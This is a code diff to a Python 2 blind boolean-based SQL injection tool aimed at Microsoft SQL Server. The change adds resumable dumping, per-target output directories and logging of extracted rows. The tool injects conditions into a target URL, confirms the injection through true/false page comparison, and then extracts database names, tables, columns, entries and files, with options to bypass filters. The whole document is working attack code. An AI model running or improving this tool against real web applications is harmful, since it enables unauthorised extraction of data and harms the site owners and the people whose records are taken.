@@ -31,6 +31,8 @@ class MssqlTrueFalse:
 		if not re.match("http",url):
 			print "-u http<url>"
 			sys.exit();
+		if output_dir=="my_dump":
+			output_dir = re.findall("https?://([^/]*).*",url)[0]
 
 		self.url = re.sub("1=([^1]*)1","1=1 W00T",url)
 		self.post = re.sub("1=([^1]*)1","1=1 W00T",post)
@@ -55,7 +57,14 @@ class MssqlTrueFalse:
 
 		self.verbose = verbose
 		self.error = error
-		self.testInjection()
+
+		if not os.path.isdir("dump/" + output_dir):
+			ok = self.testInjection()
+			if not ok:
+				sys.exit()
+			else:
+				os.mkdir("dump/" + output_dir)
+		self.output_dir = output_dir
 
 	def testInjection(self):
 		self.valide = self.doRequest()
@@ -64,14 +73,14 @@ class MssqlTrueFalse:
 			if self.valide != valide2:
 				print "Hard to deteremine the good page"
 				print "Try to add error option to help (option --Error)"
-				sys.exit()
+				return False
 			print "Found valid page... You can add error option to improve (option --Error)"
 
 		self.changeInject("1=2")
 
 		if self.testTrueFalse():
 			print "Bad injection ?"
-			sys.exit()
+			return False
 		print "Injection seems good, let's check if DB_NAME() exist..."
 
 		string = self.tricks("(select count(DB_NAME())) = 1")
@@ -79,8 +88,9 @@ class MssqlTrueFalse:
 
 		if not(self.testTrueFalse()):
 			print "DB_NAME() not found, sorry I can't do anything more."
-			sys.exit()
+			return False
 		print "Everything seems good. Dump can begin."
+		return True
 
 	def changeInject(self,new):
 		self.inject = re.sub("1=1",new,self.inject)
@@ -223,8 +233,18 @@ class MssqlTrueFalse:
 
 	def dump(self, request, colonne, begin, end):
 		dump=[]
+		f = open("dump/" + self.output_dir + "/dumped","a+")
+		f.write(request+"\n")
+		f.close()
 		for i in range(begin,end):
-			dump.append(self.value(request,colonne, i))
+			f=open("dump/" + self.output_dir + "/state","w")
+			f.write(str(i)+":"+str(end))
+			f.close()
+			entrie = self.value(request,colonne, i)
+			f=open("dump/" + self.output_dir + "/dumped","a+")
+			f.write("line " + str(i) + " : "+entrie+"\n")
+			f.close()
+			dump.append(entrie)
 		return dump
 
 	def dumpFile(self, file, begin = 1, end = 0):
@@ -307,7 +327,7 @@ if __name__ == "__main__":
 	parser.add_option("-e", "--end", action="store", type="string", dest="end",default="0", help="Finish dumping with the <end> line")
 	parser.add_option("-C", "--Condition", action="store", type="string", dest="condition",default="", help="Specify condition ex : -C 'login=admin'")
 	parser.add_option("-m", "--Modif", action="store", type="string", dest="modification",default="0", help="Specify tricks to bypass filter (type -m list to list the tricks)")
-	parser.add_option("-w", "--write", action="store", type="string", dest="output_dir",default="", help="Directory to save the dump")
+	parser.add_option("-w", "--write", action="store", type="string", dest="output_dir",default="my_dump", help="Directory to save the dump")
 
 	(options, args) = parser.parse_args()
 	if options.modification == "list":
@@ -316,19 +336,33 @@ if __name__ == "__main__":
 
 	myInjector = MssqlTrueFalse(options.url, options.post, options.cookie, options.verbose, options.error, options.modification, options.output_dir)
 
+	if os.path.isfile("dump/" + myInjector.output_dir + "/state"):
+		f=open("dump/" + myInjector.output_dir + "/state","r")
+		s_begin, s_end = f.read().split(":")
+		f.close()
+		begin=int(s_begin,10)
+		end=int(s_end,10)
+	else:
+		begin = int(options.begin,10)
+		end = int(options.end,10)
+
+	if options.begin!="1":
+		begin=int(options.begin,10)
+
+
 	if options.file!="":
-		myInjector.dumpFile(options.file,int(options.begin,10),int(options.end,10))
+		myInjector.dumpFile(options.file, begin, end)
 	elif options.special!="":
-		myInjector.dumpSpecial(options.special,int(options.begin,10),int(options.end,10))
+		myInjector.dumpSpecial(options.special, begin, end)
 	else:
 		if options.database=="":
-			print myInjector.dumpDB(int(options.begin,10),int(options.end,10),options.condition)
+			print myInjector.dumpDB(begin, end, options.condition)
 		elif options.table=="":
-			print myInjector.dumpTables(options.database,int(options.begin,10),int(options.end,10),options.condition)
+			print myInjector.dumpTables(options.database, begin, end, options.condition)
 		elif options.colonne=="":
-			print myInjector.dumpColumns(options.database,options.table,int(options.begin,10),int(options.end,10),options.condition)
+			print myInjector.dumpColumns(options.database,options.table, begin, end, options.condition)
 		else:
-			print myInjector.dumpEntries(options.database,options.table,options.colonne,int(options.begin,10),int(options.end,10),options.condition)
+			print myInjector.dumpEntries(options.database,options.table,options.colonne, begin, end, options.condition)
 
 
 	print "Done in %d request" %myInjector.getStat()
